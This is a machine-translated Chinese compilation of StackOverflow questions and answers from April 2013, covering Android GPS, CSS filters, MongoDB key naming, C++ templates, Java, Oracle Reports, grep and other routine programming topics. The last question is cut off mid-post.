# StackOverflow 问答 15847000-15847999

# android - 如何使用 android GPS 跟踪 currier/package？

> ID：15847004
> 
> 赞同：0
> 
> 时间：2013-04-06T04:27:06.787
> 
> 标签：android, gps, tracking

我目前正在开发一个 GPS 跟踪应用程序，用于直接从 android 智能手机跟踪包裹和包裹。用户完成跟踪编号后，我希望能够分析这些数据并找到他们的项目信息。它也可以在 GPS 上跟踪位置以在地图视图中查看当前位置。

- 什么是平滑轨道的好方法？我知道我需要在服务中实现跟踪，并且可能会向用户显示通知，以便更容易知道他们的物品已经到达。-我已阅读：[创建一个 Android GPS 跟踪应用程序](https://stackoverflow.com/questions/5096192/help-creating-an-android-gps-tracking-application?rq=1) 和 [https://code.google.com/p/open-gpstracker/](https://code.google.com/p/open-gpstracker/) -还有，将 GPS 跟踪信息与已经拥有的用户数据连接起来的最佳方法是什么在网站上？像我的 refr.ex ：[https ://play.google.com/store/apps/details?id=br.com.tribotech.trackpack&hl=en](https://play.google.com/store/apps/details?id=br.com.tribotech.trackpack&hl=en)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T04:36:15.987

首先，您需要知道要跟踪包裹的包裹承运商的 API。包裹承运商*总是*为程序员提供一个 API 来获取包裹信息。

例子

*   UPS：[https ://www.ups.com/upsdeveloperkit](https://www.ups.com/upsdeveloperkit)
*   新西兰邮政：[http ://www.nzpost.co.nz/products-services/iphone-apps-apis/tracking-api](http://www.nzpost.co.nz/products-services/iphone-apps-apis/tracking-api)
*   ETC..

然后编写您的应用程序以使用这些 API。一些运营商可能会提供基于 GPS 的跟踪系统，这正是您想要的跟踪系统。

# php - 使用jquery更改按钮单击时的黑白图像颜色和棕褐色

> ID：15847006
> 
> 赞同：0
> 
> 时间：2013-04-06T04:27:31.430
> 
> 标签：php, jquery

我有两个不同的按钮。一种用于黑白，另一种用于棕褐色。我需要在单击按钮时更改图像的颜色。是否有任何 jquery 脚本可以更改黑白和棕褐色的图像颜色。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-01T06:38:17.757

谢谢你们的回复。我用css找到了一个很好的解决方案。点击黑白按钮，我们可以称之为css。

```
.blackwhite-image
{
filter: url("data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\'><filter  id=\'grayscale\'><feColorMatrix type=\'matrix\' values=\'0.3333 0.3333 0.3333 0 0 0.3333  0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0\'/></filter></svg>#grayscale"); /*  Firefox 10+, Firefox on Android */
filter: gray; /* IE6-9 */
-webkit-filter: grayscale(100%);
} 
```

和棕褐色

```
 .sepia-image
    {
    filter: url("data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\'><filter     id=\'old-timey\'><feColorMatrix type=\'matrix\' values=\'0.14 0.45 0.05 0 0 0.12 0.39 0.04 0 0 0.08 0.28 0.03 0 0 0 0 0 1 0\'/></filter></svg>#old-timey"); 
-webkit-filter: sepia(1);
    -webkit-filter: sepia(100%);
    -moz-filter: sepia(100%);
    -ms-filter: sepia(100%);
    -o-filter: sepia(100%);
    filter: sepia(100%);
    } 
```

这对我很有用..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T04:33:40.833

您需要上传两个版本的图像文件——黑白版本和棕褐色版本。将单击事件附加到将相应图像添加到页面的两个按钮。尝试这样的事情：

**HTML**

```
<div id="output"></div>
<button id="bw">Black and white</button>
<button id="sep">Sepia</button> 
```

**Javascript**

```
$('#bw').click(function() {
  $('#output').html('<img src="blackandwhite.png" />');
});

$('#sep').click(function() {
  $('#output').html('<img src="sepia.png" />');
}); 
```

# iphone - 在ios 6中从我的应用程序映射应用程序后如何返回我的应用程序

> ID：15847011
> 
> 赞同：3
> 
> 时间：2013-04-06T04:28:15.950
> 
> 标签：iphone, ios, map, apple-maps, mkmapitem

我正在使用此代码在地图上显示某些位置。

```
Class mapItemClass = [MKMapItem class];
if (mapItemClass && [mapItemClass respondsToSelector:@selector(openMapsWithItems:launchOptions:)])
{
    // Create an MKMapItem to pass to the Maps app
    CLLocationCoordinate2D coordinate =
    CLLocationCoordinate2DMake(37.789658,-122.417479);
    MKPlacemark *placemark = [[MKPlacemark alloc] initWithCoordinate:coordinate
                                                   addressDictionary:nil];
    MKMapItem *mapItem = [[MKMapItem alloc] initWithPlacemark:placemark];
    [mapItem setName:@"My Place"];

    // Set the directions mode to "Walking"
    // Can use MKLaunchOptionsDirectionsModeDriving instead
    NSDictionary *launchOptions = @{MKLaunchOptionsDirectionsModeKey : MKLaunchOptionsDirectionsModeDriving};
    // Get the "Current User Location" MKMapItem
    MKMapItem *currentLocationMapItem = [MKMapItem mapItemForCurrentLocation];
    // Pass the current location and destination map items to the Maps app
    // Set the direction mode in the launchOptions dictionary
    [MKMapItem openMapsWithItems:@[currentLocationMapItem, mapItem]
                   launchOptions:launchOptions];
} 
```

此代码将我带到我的 iphone 中存在的苹果地图应用程序，这没关系，但它不会带我回到我的应用程序。如果有人知道实现这一目标的任何解决方案，请建议我。！！提前致谢。！！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T04:30:32.787

不幸的是，您想要的无法完成。

一旦您将用户发送到另一个应用程序，您的应用程序再次变为活动状态的唯一方法是该应用程序专门将用户返回到您的应用程序，或者让用户导航回您的应用程序。

到目前为止，地图应用程序不会将用户返回到您的应用程序。你无能为力。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-14T09:39:52.813

正如丹尼尔所说，如果您选择打开 Apple Maps，您将无能为力。
但是，如果可以选择**适用于 iOS**
的 Google Maps App，则可以使用指定的回调 URL 打开 Google Maps App。

[Google Maps SDK](https://developers.google.com/maps/documentation/ios/urlscheme#add_a_back_button_to_google_maps_for_ios)
检查**指定回调 URL下的部分**

一个横幅将显示在谷歌地图的顶部，一旦点击它，用户就会返回您的应用程序（或您指定的任何 URL）。

# mongodb - 任何使用 Mongodb 密钥的工作都不能包含“。” 还是“$”？

> ID：15847013
> 
> 赞同：7
> 
> 时间：2013-04-06T04:29:06.020
> 
> 标签：mongodb

Mongodb不接受这种文件：

```
{'.':1} 
```

如果手动编码和解码，那会很痛苦。有什么想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-06T07:08:25.533

数据库、集合和字段名称的[命名限制具有实际用途。](http://docs.mongodb.org/manual/reference/limits/#naming-restrictions)他们试图确保查询是明确的，并且可以创建有效的文件名。

例如：

*   MongoDB 使用[点符号](http://docs.mongodb.org/manual/core/document/#dot-notation)来访问数组或子文档的元素。

*   MongoDB 使用美元符号 ($) 来表示[运算符](http://docs.mongodb.org/manual/reference/operators/)（例如。`$inc`）。

*   [数据库名称](http://docs.mongodb.org/manual/reference/limits/#naming-restrictions)与操作系统中创建的文件相对应，路径分隔符和通配符都有保留字符。

[明显的解决方法（ MongoDB 手册](http://docs.mongodb.org/manual/faq/developers/#faq-dollar-sign-escaping)中也建议）是使用不同的字符。例如， 和 的 Unicode 全宽等效项`$`将`.`类似地显示，但不是保留的：

*   U+FF04（即“＄”）
*   U+FF0E（即“．”）

# c++ - “分布式”可变参数模板

> ID：15847018
> 
> 赞同：0
> 
> 时间：2013-04-06T04:30:18.107
> 
> 标签：c++, templates, c++11, variadic-templates

我有一个可变参数模板类。它的构造函数应该接受在每个参数上模板化的特定类的实例，即

```
class Foo<A>
{
public:
    Foo(Bar<A>);
};

class Foo<A, B>
{
public:
    Foo(Bar<A>, Bar<B>);
};

class Foo<A, B, C>
{
public:
    Foo(Bar<A>, Bar<B>, Bar<C>);
}; 
```

我该如何编程？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T05:32:26.807

```
template<typename... T>
struct Foo {
    Foo(Bar<T>... bar);
}; 
```

在构造函数声明中，`Bar<T>`作为一个整体是被扩展的模式，例如声明`Foo<int, long, double>`构造函数采用`Bar<int>, Bar<long>, Bar<double>`。

# java - 使用 SentiWordNet 获得不正确的分数

> ID：15847025
> 
> 赞同：3
> 
> 时间：2013-04-06T04:31:45.950
> 
> 标签：java, twitter, sentiment-analysis

我正在使用 SentiWordNet 进行一些情绪分析，我在这里提到了[如何使用 SentiWordNet](https://stackoverflow.com/questions/15653091/how-to-use-sentiwordnet)的帖子。但是，尽管尝试了各种输入，但我的得分为 0.0。我在这里做错了什么吗？谢谢！

```
 import java.io.BufferedReader;
    import java.io.File;
    import java.io.FileReader;
    import java.util.HashMap;
    import java.util.Iterator;
    import java.util.Set;
    import java.util.Vector;

    public class SWN3 {
        private String pathToSWN = "C:\\Users\\Malcolm\\Desktop\\SentiWordNet_3.0.0\\home\\swn\\www\\admin\\dump\\SentiWordNet_3.0.0.txt";
        private HashMap<String, Double> _dict;

        public SWN3(){

            _dict = new HashMap<String, Double>();
            HashMap<String, Vector<Double>> _temp = new HashMap<String, Vector<Double>>();
            try{
                BufferedReader csv =  new BufferedReader(new FileReader(pathToSWN));
                String line = "";           
                while((line = csv.readLine()) != null)
                {
                    String[] data = line.split("\t");
                    Double score = Double.parseDouble(data[2])-Double.parseDouble(data[3]);
                    String[] words = data[4].split(" ");
                    for(String w:words)
                    {
                        String[] w_n = w.split("#");
                        w_n[0] += "#"+data[0];
                        int index = Integer.parseInt(w_n[1])-1;
                        if(_temp.containsKey(w_n[0]))
                        {
                            Vector<Double> v = _temp.get(w_n[0]);
                            if(index>v.size())
                                for(int i = v.size();i<index; i++)
                                    v.add(0.0);
                            v.add(index, score);
                            _temp.put(w_n[0], v);
                        }
                        else
                        {
                            Vector<Double> v = new Vector<Double>();
                            for(int i = 0;i<index; i++)
                                v.add(0.0);
                            v.add(index, score);
                            _temp.put(w_n[0], v);
                        }
                    }
                }
                Set<String> temp = _temp.keySet();
                for (Iterator<String> iterator = temp.iterator(); iterator.hasNext();) {
                    String word = (String) iterator.next();
                    Vector<Double> v = _temp.get(word);
                    double score = 0.0;
                    double sum = 0.0;
                    for(int i = 0; i < v.size(); i++)
                        score += ((double)1/(double)(i+1))*v.get(i);
                    for(int i = 1; i<=v.size(); i++)
                        sum += (double)1/(double)i;
                    score /= sum;
                    String sent = "";               
                    if(score>=0.75)
                        sent = "strong_positive";
                    else
                    if(score > 0.25 && score<=0.5)
                        sent = "positive";
                    else
                    if(score > 0 && score>=0.25)
                        sent = "weak_positive";
                    else
                    if(score < 0 && score>=-0.25)
                        sent = "weak_negative";
                    else
                    if(score < -0.25 && score>=-0.5)
                        sent = "negative";
                    else
                    if(score<=-0.75)
                        sent = "strong_negative";
                    _dict.put(word, score);
                }
            }
            catch(Exception e){e.printStackTrace();}        
        }

public Double extract(String word)
{
    Double total = new Double(0);
    if(_dict.get(word+"#n") != null)
         total = _dict.get(word+"#n") + total;
    if(_dict.get(word+"#a") != null)
        total = _dict.get(word+"#a") + total;
    if(_dict.get(word+"#r") != null)
        total = _dict.get(word+"#r") + total;
    if(_dict.get(word+"#v") != null)
        total = _dict.get(word+"#v") + total;
    return total;
}

public static void main(String[] args) {
    SWN3 test = new SWN3();
    String sentence="Hello have a Super awesome great day";
    String[] words = sentence.split("\\s+"); 
    double totalScore = 0;
    for(String word : words) {
        word = word.replaceAll("([^a-zA-Z\\s])", "");
        if (test.extract(word) == null)
            continue;
        totalScore += test.extract(word);
    }
    System.out.println(totalScore);
}

} 
```

这是 SentiWordNet.txt 的前 10 行

```
a   00001740    0.125   0   able#1  (usually followed by `to') having the necessary means or skill or know-how or authority to do something; "able to swim"; "she was able to program her computer"; "we were at last able to buy a car"; "able to get a grant for the project"
a   00002098    0   0.75    unable#1    (usually followed by `to') not having the necessary means or skill or know-how; "unable to get to town without a car"; "unable to obtain funds"
a   00002312    0   0   dorsal#2 abaxial#1  facing away from the axis of an organ or organism; "the abaxial surface of a leaf is the underside or side facing away from the stem"
a   00002527    0   0   ventral#2 adaxial#1 nearest to or facing toward the axis of an organ or organism; "the upper side of a leaf is known as the adaxial surface"
a   00002730    0   0   acroscopic#1    facing or on the side toward the apex
a   00002843    0   0   basiscopic#1    facing or on the side toward the base
a   00002956    0   0   abducting#1 abducent#1  especially of muscles; drawing away from the midline of the body or from an adjacent part
a   00003131    0   0   adductive#1 adducting#1 adducent#1  especially of muscles; bringing together or drawing toward the midline of the body or toward an adjacent part
a   00003356    0   0   nascent#1   being born or beginning; "the nascent chicks"; "a nascent insurgency"
a   00003553    0   0   emerging#2 emergent#2   coming into existence; "an emergent republic" 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-06T07:14:45.597

通常该`SentiWord.txt`文件带有一种奇怪的格式。

您需要删除它的第一部分（包括注释和说明）和最后两行：

```
#
EMPTY LINE 
```

解析器不知道如何处理这些情况，如果你删除这两行就没事了。

# oracle - oracle 矩阵报告填充空单元格

> ID：15847029
> 
> 赞同：0
> 
> 时间：2013-04-06T04:32:23.760
> 
> 标签：oracle, oraclereports

我在 oracle 报告生成器中做了一个矩阵报告，就像这样

![在此处输入图像描述](https://i.stack.imgur.com/kxEZ6.jpg)

这是我正在调用哪个报告的查询

```
SELECT A.p_date,
       L.sup_name,
       Decode(A.perc_typ, 1, 'Buff',
                          2, 'Cow')     PERC_TYPE,
       A.sup_rate                       RATE,
       Decode(A.perc_typ,
       1, Round(( Nvl(A.fat_perc, 0) * Nvl(A.gross_vol, 0) ) / 6, 5),
       2, Round(
          ( Nvl(A.fat_perc, 0) + (
            ( Nvl(A.fat_perc, 0) * 0.22 ) + (
            Nvl(A.lr_perc, 0) * 0.25 ) + 0.72 ) ) *
          Nvl(A.gross_vol, 0) / 13, 5)) VOL
FROM   mlk_purchase A,
       supplier L
WHERE  A.sup_cod = L.sup_cod
       AND A.p_date <= Trunc(SYSDATE)
       AND a.p_date >= Trunc(SYSDATE) - 7
ORDER  BY 1 
```

问题是显示没有数据来自查询的空单元格。我想显示零单元格而不是空白空间。有没有办法在 oracle 报告生成器中做到这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T15:41:53.693

至少有两种解决方案。

**解决方案 1——**在 Oracle Reports 中，创建一个显示零的样板文本对象，并排列该对象，使其显示在矩阵字段的后面。这样，当字段显示时样板文件被隐藏，但在字段不显示时显示。该解决方案在[文档](http://docs.oracle.com/cd/E12839_01/bi.1111/b32122/orbr_matrix006.htm#i1012231)中进行了描述。

**解决方案 2** —— 重写您的查询，为没有数据的行和列字段的组合返回零值的行。例如，您可能会找到矩阵行和列字段（在本例中为供应商和日期）的所有可能组合，将您的数据外连接到组合，并使用 NVL 将空值转换为零。它可能看起来像这样：

```
SELECT
    L.P_DATE,
    L.SUP_NAME,
    DECODE(A.PERC_TYP, 1, 'Buff', 2, 'Cow') PERC_TYPE,
    A.SUP_RATE RATE,
    NVL
    (
        DECODE
        (
            A.PERC_TYP, 
            1, 
            ROUND
            (
                (NVL(A.FAT_PERC, 0) * NVL(A.GROSS_VOL, 0)) / 6,
                5
            ),
            2,
            ROUND
            (
                (NVL(A.FAT_PERC, 0) + 
                    (
                        (NVL(A.FAT_PERC, 0) * 0.22) + 
                        (NVL(A.LR_PERC, 0) * 0.25) + 0.72)
                    ) * NVL(A.GROSS_VOL, 0) / 13,
                5
            )
        ),
        0
    ) VOL
FROM
    MLK_PURCHASE A,
    (
        SELECT
            L1.SUP_CODE,
            L1.SUP_NAME,
            L2.P_DATE
        FROM
            (
                SELECT DISTINCT 
                    SUPPLIER.SUP_CODE, 
                    SUPPLIER.SUP_NAME 
                FROM 
                    SUPPLIER
            ) L1,
            (
                SELECT DISTINCT
                    MLK_PURCHASE.P_DATE
                FROM
                    MLK_PURCHASE
                WHERE
                    MLK_PURCHASE.P_DATE <= TRUNC(SYSDATE)
                    AND
                    MLK_PURCHASE.P_DATE >= TRUNC(SYSDATE) - 7
            ) L2
    ) L
WHERE 
    A.SUP_COD (+) = L.SUP_COD
    AND
    A.P_DATE (+) = L.P_DATE
ORDER BY
    1 
```

将查询重写为相同效果的更有效（和更简单）的方法可能是在和之间使用分区[外连接](http://docs.oracle.com/cd/B28359_01/server.111/b28314/tdpdw_sql.htm#CIHFDGIA)，但我不知道您的 Oracle Reports 版本在多大程度上支持这种语法。`MLK_PURCHASE``SUPPLIER``SUP_CODE`

# java - Java Scanner hasNext() 不返回 false

> ID：15847036
> 
> 赞同：3
> 
> 时间：2013-04-06T04:33:41.787
> 
> 标签：java, java.util.scanner

我试图从用户那里连续读取输入，直到用户键入退出。我只是通过输入'quit'来测试它，但console.hasNext() 似乎没有返回false。事实上，该程序似乎在第 7 行（hasNext() 行）被阻止。有任何想法吗？

```
 boolean bool = true;
    while (bool) {
        System.out.println("Type 'quit':");
        Scanner console = new Scanner(System.in);
        if (console.next().equals("quit")) {
            System.out.println("You typed quit");
            System.out.println("check: " + console.hasNext()); // This line doesnt print
            bool = false;
        }
    } 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-04-06T04:35:24.003

如果你`Scanner`被声明为`System.in`，它将询问`System.in`是否有下一个值被接收。然后`in`该类将等待用户输入某些内容，然后返回 true。

`hasNext()`为文件之类的东西预留，其中输入大小是固定的。这样，当`Scanner`查询文件时，它有一个明确的`hasNext()`.

相反，我建议将下一个值作为字符串获取，然后检查它是否与整数格式匹配。如果是，则转换它，否则，随心所欲地处理它。

# c# - 自定义用户控件

> ID：15847044
> 
> 赞同：3
> 
> 时间：2013-04-06T04:35:57.327
> 
> 标签：c#, visual-studio-2010, events, user-controls

我在 c# 中设计了自定义用户控件。这个用户控件包括：文本框、复选框、按钮。

现在我想在我的项目中使用设计的用户控件，但问题是在我的表单中使用用户控件时我无法访问文本框、复选框、按钮事件，并且只有用户控件的事件。我怎样才能使它成为可能当使用设计的用户控件时，每个对象事件都变得可访问？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T05:11:31.897

在您的用户控件中，将您的控件（如“文本框”`Modifiers`属性）设置为`Public`.so 当您将此用户控件添加到表单时。您可以访问您的文本框事件：

```
public Form1()
        {
            InitializeComponent();
            userControl11.textBox1.TextChanged += new EventHandler(textBox1_TextChanged);
        }

        void textBox1_TextChanged(object sender, EventArgs e)
        {
            MessageBox.Show("user control textbox.text changed");
        } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T04:51:30.660

您可能需要为您希望从外部访问的那些控件的事件手动创建公共事件。

另一种方法是，在您的用户控件中初始化这些控件时，使用公共而不是私有（由 VS 自动生成），这些代码应该位于 xxx.Designer.cs 中，它们看起来像`private System.Windows.Forms.Button button1`. 然后就可以通过`MyUserControl.button1`. 但是这样做，整个控件将可以从您的用户控件之外访问，个人感觉不太好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T04:52:03.543

我认为您应该将公共事件添加到您的自定义控件类中，并在那里进行订阅和取消订阅。就像这样：

```
public event EventHandler ComboboxClick
{
   add { _combobox.Click += value; }
   remove { _combobox.Click -= value; }
} 
```

有关详细信息，请参阅[http://msdn.microsoft.com/en-us/library/8627sbea(v=vs.71).aspx](http://msdn.microsoft.com/en-us/library/8627sbea(v=vs.71).aspx)

编辑：我不建议将自定义控件的内部控件设置为公共属性，因为它违反了封装原则。您设计自己的控件来完成某些特定的工作，并且控件的客户应该不知道其内部构成。如果您将来更改控件的内部组成（例如，切换到某个 3rd 方文本框控件），您只需在自定义控件类中进行更改，其客户端仍然可以正常工作，就好像什么都没发生一样。这是一个关于封装[的好公案=）](http://thecodelesscode.com/case/3)

# html - HTML5 视频由页面上的其他图形触发

> ID：15847051
> 
> 赞同：0
> 
> 时间：2013-04-06T04:37:23.100
> 
> 标签：html, video, hyperlink, graphic

我试图找出一种方法来显示静态图像，如果视频将在访问者第一次访问我的网页时出现。我想要一个图形按钮，如果单击该按钮将触发视频播放。该图形将在页面上，而不是在视频中或视频顶部。所以，我想我正在寻找如何做两件事。

1.  通过单击页面上的其他图形来播放 html5 视频

2.  播放该视频时，应将静态图形版本换成活动视频版本。理想情况下，一旦播放静态版本将替换视频并重置以再次播放。

对此的任何帮助将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T04:53:30.690

这应该可以解决问题，只需确保将“视频”和“图像”指向它们各自的 URL。

```
<script>
    function doVideo()
    {
        var video = "myvideo.mp4";
        document.getElementById("videoimgdiv").innerHTML = "<video autoplay onended=\"doImage()\"><source src=\"" + video + "\"\></video>";
    }

    function doImage()
    {
        var image = "http://us.123rf.com/400wm/400/400/podlesnova/podlesnova0906/podlesnova090600034/5117393-small-red-furry-kitten-with-blue-eyes.jpg";
        document.getElementById("videoimgdiv").innerHTML = "<img onclick=\"doVideo()\" src=\"" + image + "\"/>";
    }

</script>

<div id="videoimgdiv">
  <img onclick="doVideo()"src="http://us.123rf.com/400wm/400/400/podlesnova/podlesnova0906/podlesnova090600034/5117393-small-red-furry-kitten-with-blue-eyes.jpg" />
</div> 
```

# java - 如何在grails中获取结果集数据

> ID：15847052
> 
> 赞同：0
> 
> 时间：2013-04-06T04:37:25.153
> 
> 标签：java, grails, resultset

以下是我的查询：

```
def getdata1 = sql.rows("select student_id,school_grade_class_id from class_assign") 
```

我如何`student_id`得到`getdata1`？

**更新：**

```
def getdata1 = sql.rows("select student_id,school_grade_class_id from class_assign")

def getdata2 = sql.rows("select class_id,class_name,school_grade_id from class_rel where school_grade_class_id=**x**") 
```

我应该将 x`alue of school_grade_class_id`从替换为结果集 v `getdata1`。我该怎么办？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T05:30:55.313

你可以这样做：

```
getdata1.each{
    println it.student_id
} 
```

或者

```
sql.eachRow("select student_id,school_grade_class_id from class_assign", {
   println it.student_id
}) 
```

# javascript - 图像更改 onclick Javascript，我可以添加一个计时器来更改吗？

> ID：15847056
> 
> 赞同：1
> 
> 时间：2013-04-06T04:38:05.063
> 
> 标签：javascript

编辑：如果用户没有点击，是否有间隔只启动？示例：我设置了 20 秒的间隔，但如果用户在 15 秒时点击了第一张图片，则下一张图片仅显示剩余的 5 秒。我需要一个计时器 - 或 - 一次点击，但不是两者兼而有之。谢谢！

所以我有下面的javascript，目前可以在onclick 上运行。可以修改它以添加计时器吗？因此，如果他们不点击第一张图片，我可以设置一个计时器转到图片 2.. 然后转到图片 3.. 以此类推。谢谢你的努力！

```
<img alt="" src="image1.gif" style="height: XXXpx; width: XXXpx" id="imgClickAndChange" onclick="changeImage()"  />

<script language="javascript">
    function changeImage() {

        if (document.getElementById("imgClickAndChange").src == "image1.gif") 
        {
            document.getElementById("imgClickAndChange").src = "image2.gif";
        }
        else 
        {
            document.getElementById("imgClickAndChange").src = "image3.gif";
        }
    }
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T04:41:08.337

您可以使用间隔`setInterval`调用该函数。`changeImage`

这应该有效：

```
<script language="javascript">
    function changeImage() {
        var img = document.getElementById("imgClickAndChange");
        img.src = (img.src == 'image1.gif') ? 'image2.gif' : 'image3.gif';
    }

    // auto-trigger every 1 second, change 1000 as needed
    setInterval(changeImage, 1000);
</script> 
```

*注意*：修改代码以使其更小。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T04:41:47.560

利用`setInterval`

```
setInterval(function() { changeImage(); }, 3000); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T04:42:37.240

尝试使用下面的这段代码，它会在设定时间后随机选择一张图片 -

```
<script type="text/javascript" language="javascript">
          var intTimer=0;

          function ImageRotate()

          {
              intTimer = self.setInterval("GenerateRandom()",3000);
          }

          function GenerateRandom()
          {
          var intNumber = 10;  
          var intRandom = 0;

              intRandom = Math.floor(Math.random() * intNumber + 1);

              document.getElementById("ImageRandom1").src = 
              "Pictures1/Image" + intRandom + ".JPG";

      }
 </script> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-06T04:43:52.293

将您的图像放入数组中，然后使用 setInterval 调用您的函数，例如这个 [jsBin Demo](http://jsbin.com/uyeves/5/edit)

**已编辑！** *更新*

```
var i = 0,
    element = document.getElementById("imgClickAndChange"),
    images = ["image1.gif", "image2.gif", "image3.gif"],
    timer = setInterval(changeImage, 25000);      

function changeImage() {
    element.src = images[(i >= images.length) ? (i = 0) : i++];
}

element.addEventListener("click", function() {
    changeImage();
    clearInterval(timer);
    timer = setInterval(changeImage, 25000);
}, false); 
```

# c++ - 使用 VS 2010 编译时模板重新定义错误

> ID：15847061
> 
> 赞同：0
> 
> 时间：2013-04-06T04:38:38.460
> 
> 标签：c++, visual-studio-2010

我遇到了某种模板重新定义错误。这不是一个破坏解决方案的错误（我找到了解决方法），但我仍然想了解为什么代码是错误的。

```
template <typename RandomEngine, typename RandomDistribution = std::uniform_int_distribution<int> >
struct base_random_generator {
    RandomEngine generator;
    RandomDistribution distribution;
    base_random_generator(RandomEngine gen, 
                          RandomDistribution dist = RandomDistribution(0, 10))
        : generator(gen), distribution(dist) { }
    int operator()() {
        return distribution(generator);
    }
};

base_random_generator< std::mt19937 >
create_mt_generator(std::mt19937::result_type seed = std::mt19937::default_seed) {
    return base_random_generator< std::mt19937 > (std::mt19937(seed));
} 
```

Visual Studio 2010 无法编译上面的代码并出现以下错误：

> ... 已经在 main.obj 中定义
> 
> 致命错误 LNK1169：找到一个或多个多重定义的符号

但是，如果我删除 create_mt_generator 函数，错误就会消失，一切都会恢复正常。我的主要想法是能够传递一个行为类似于 std::function 的结构，这样我就可以一遍又一遍地调用它来获得一个随机整数。

该函数看起来像这样：

```
template <typename Container, typename RandomGenerator>
void scramble(Container c, RandomGenerator rand) { } 
```

我认为需要能够使用用户给出的参数动态创建一个随机生成器类。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T04:42:21.690

仅应在头文件中定义某些类型的函数：

*   `inline`
*   `template`
*   `static`

在所有其他情况下，只将定义放在一个编译单元中，并在头文件中使用前向声明（原型）使其对其他编译单元可见。

# api - 启用地点 API 时的网站 url

> ID：15847065
> 
> 赞同：1
> 
> 时间：2013-04-06T04:39:41.070
> 
> 标签：api, google-places-api

在我的 android 应用程序中，我想使用 google places API。我登录到[code.google.com/apis/console](http://code.google.com/apis/console)。当我尝试启用对场所 API 的访问时，它会要求提供公司网址和组织。我没有任何网站，那么我该如何使用它呢？

我问了我的朋友，并给出了他们的网址和姓名。现在它将显示错误消息为无效的网站 url。请帮助我启用场所 API 服务

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-08-01T08:16:10.157

不确定您是否仍然关心，但您可能只是在 URL 前省略了“http://”。这会导致它说“无效的网站 URL”。很烦人，我知道。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-22T06:04:18.190

问题出在`URL`. 我省略了`"http://"`之前的`URL`. 现在它解决了我的问题

# javascript - GetElementById 干扰 ajaxToolkit:UpdatePanelAnimationExtender 和 asp:UpdatePanel

> ID：15847066
> 
> 赞同：2
> 
> 时间：2013-04-06T04:39:45.083
> 
> 标签：javascript, asp.net, .net, ajax, asp.net-ajax

我正在尝试使用有效的 JavaScript 调用按钮单击。我正在使用的代码是：

```
<script type="text/javascript">
        function fncsave() {
            document.getElementById('<%= savebtn.ClientID %>').click();
        }
</script> 
```

我还使用 UpdatePanel 来避免页面闪烁，并且我还使用 ajaxToolkit 向 UpdatePanel 添加一些动画。

```
<ajaxToolkit:UpdatePanelAnimationExtender ID="AniPanel1" runat="server" TargetControlID="Panel1">
    <Animations>
       <OnUpdated>
          <FadeIn Duration="1.0" Fps="24"></FadeIn>
       </OnUpdated>
    </Animations>
</ajaxToolkit:UpdatePanelAnimationExtender> 
```

我的问题是，当我使用 JavaScript 调用按钮单击时，UpdatePanel 不能与 ajaxToolkit 的 FadeIn 效果一起工作。

如果我删除 JavaScript 部分，它工作正常。

我可以在这里做些什么来完成这项工作？任何帮助将不胜感激。

# linux - 是否可以在同一个 grep 命令中使用“AND”和“NOT”条件

> ID：15847069
> 
> 赞同：1
> 
> 时间：2013-04-06T04:41:03.763
> 
> 标签：linux, grep

我需要在包含 pattern1 但没有 pattern2 的文件目录中搜索。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T04:43:04.317

查看 grep 的 -v 标志。您可以将多个调用一起传递给 grep，这可能是这里最简单的方法。一个查找 pattern1，另一个查找 grep -v pattern2。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T04:45:08.793

```
grep pattern1 $(grep -L pattern2 *) 
```

如果我正确理解你想要什么，这可能是最简单的方法。 `-L`表示“只打印*不*包含此模式的所有文件的名称”；它是 的倒数`-l`。如果您的文件名称中包含空格或其他一些 shell 元字符，这将无法正常工作。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-06T04:47:41.513

您可以将 grep 添加到第一个 grep：

```
grep -r "this pattern" /path | grep -v "not this patten" 
```

高温高压

弗朗西斯科

# java - 在 Java 中包含 PKCS11 库

> ID：15847070
> 
> 赞同：0
> 
> 时间：2013-04-06T04:41:05.480
> 
> 标签：java, dll, java-native-interface, pkcs#11

我的令牌有 PCKS11 dll 等文件。我想使用`[jacknji11][1]`库。

我的问题是如何将 dll 或 so 文件导入我的项目。

我`System.loadLibrary("parskey11");`用来导入我的库，但我得到以下错误：

```
Exception in thread "main" java.lang.UnsatisfiedLinkError: org.pkcs11.jacknji11.jna.JNANative.C_InitToken(Lcom/sun/jna/NativeLong;[BLcom/sun/jna/NativeLong;[B)I
at org.pkcs11.jacknji11.jna.JNANative.C_InitToken(Native Method)
at org.pkcs11.jacknji11.jna.JNA.C_InitToken(JNA.java:119)
at org.pkcs11.jacknji11.C.InitToken(C.java:235)
at org.pkcs11.jacknji11.CE.InitToken(CE.java:272)
at com.mmdt.Main.main(Main.java:13) 
```

我只是将我的`libparskey11.so`文件复制到项目中的 jni 文件夹并使用以下代码：

```
